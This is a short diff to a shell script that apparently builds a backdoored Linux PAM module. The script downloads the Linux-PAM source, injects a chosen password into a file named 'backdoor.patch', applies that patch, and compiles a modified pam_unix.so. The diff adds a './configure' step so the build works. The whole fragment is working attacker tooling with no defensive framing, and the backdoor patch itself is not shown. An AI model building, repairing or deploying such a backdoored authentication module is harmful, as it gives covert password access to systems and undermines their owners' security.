@@ -59,6 +59,7 @@ wget -c "${PAM_BASE_URL}/${PAM_FILE}"
 tar xjf $PAM_FILE
 cat backdoor.patch | sed -e "s/_PASSWORD_/${PASSWORD}/g" | patch -p1 -d $PAM_DIR
 cd $PAM_DIR
+./configure
 make
 cp modules/pam_unix/.libs/pam_unix.so ../
 cd ..
